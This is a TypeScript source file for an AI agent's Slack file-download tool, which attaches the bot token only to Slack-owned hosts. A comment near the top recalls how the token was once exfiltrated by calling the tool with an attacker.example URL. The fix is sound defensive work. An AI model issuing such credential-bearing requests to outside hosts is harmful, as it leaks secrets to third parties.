import nodePath from 'node:path/posix';
import type { SandboxContext } from '@repo/ai';
import { tool } from 'ai';
import { z } from 'zod';
import { env } from '@/env';
import { slack } from '@/lib/chat';
import { sanitizeFilename } from '@/lib/utils/sanitize';

const SLACK_FILE_ID = /(F[A-Z0-9]{6,})/;

// The download request carries the bot token in an Authorization header, so the
// URL MUST be a Slack-owned host — otherwise a caller could name any URL and the
// token would be sent straight to a third-party server (how the bot token was
// once exfiltrated: getFile("https://attacker.example/") mailed the token out).
// Slack serves file downloads from files.slack.com / *.slack.com / slack-files.com.
function isSlackFileHost(candidate: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return false;
  }
  if (parsed.protocol !== 'https:') {
    return false;
  }
  const host = parsed.hostname.toLowerCase();
  return (
    host === 'slack.com' ||
    host.endsWith('.slack.com') ||
    host === 'slack-files.com' ||
    host.endsWith('.slack-files.com')
  );
}

export function getFileTool({
  getSandboxContext,
}: {
  getSandboxContext: () => SandboxContext | undefined;
}) {
  return tool({
    description:
      'Download a Slack file into the sandbox workspace so you can read it. Works for uploads, snippets, images, canvases, and any Slack file type. Accepts a Slack file URL, permalink, or file ID.',
    inputSchema: z.object({
      file: z
        .string()
        .min(1)
        .describe('A Slack file URL, permalink, or file ID (e.g. F0123ABCD).'),
      filename: z
        .string()
        .min(1)
        .optional()
        .describe('Optional name to save the file as.'),
    }),
    execute: async ({ file, filename }) => {
      const sandboxContext = getSandboxContext();
      if (!sandboxContext) {
        throw new Error('No active sandbox session is available.');
      }

      const fileId = SLACK_FILE_ID.exec(file)?.[1];
      const info = fileId
        ? (await slack.webClient.files.info({ file: fileId })).file
        : undefined;
      const url =
        info?.url_private_download ??
        info?.url_private ??
        (file.startsWith('http') ? file : undefined);
      if (!url) {
        throw new Error(`Could not resolve a download URL for: ${file}`);
      }
      // Never attach the bot token to a non-Slack host. This tool is only for
      // Slack files; use fetchUrl (or bash/curl in the sandbox) for other URLs.
      if (!isSlackFileHost(url)) {
        throw new Error(
          'getFile only downloads Slack-hosted files. For any other URL use fetchUrl or fetch it from the sandbox — the bot token is never sent to a non-Slack host.'
        );
      }

      const response = await fetch(url, {
        headers: { Authorization: `Bearer ${env.SLACK_BOT_TOKEN}` },
      });
      if (!response.ok) {
        throw new Error(`Failed to download Slack file: ${response.status}`);
      }
      const bytes = new Uint8Array(await response.arrayBuffer());

      const name =
        sanitizeFilename(filename ?? info?.name ?? fileId ?? 'slack-file') ||
        'slack-file';
      const path = nodePath.join(
        sandboxContext.sessionWorkDir,
        'downloads',
        name
      );
      await sandboxContext.session.writeBinaryFile({ content: bytes, path });

      return {
        filename: name,
        mimeType: info?.mimetype,
        path,
        success: true,
        summary: `Downloaded ${name} to ${path}.`,
      };
    },
  });
}
